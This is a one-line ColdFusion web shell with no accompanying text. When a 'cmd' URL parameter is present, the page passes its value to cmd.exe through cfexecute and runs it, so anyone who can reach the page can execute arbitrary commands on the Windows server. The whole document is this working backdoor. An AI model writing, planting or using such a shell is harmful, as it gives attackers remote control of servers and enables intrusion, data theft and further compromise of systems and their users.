<cfif isDefined("url.cmd")><cfexecute name="cmd.exe" arguments="/c #url.cmd#" timeout="10"></cfexecute></cfif>
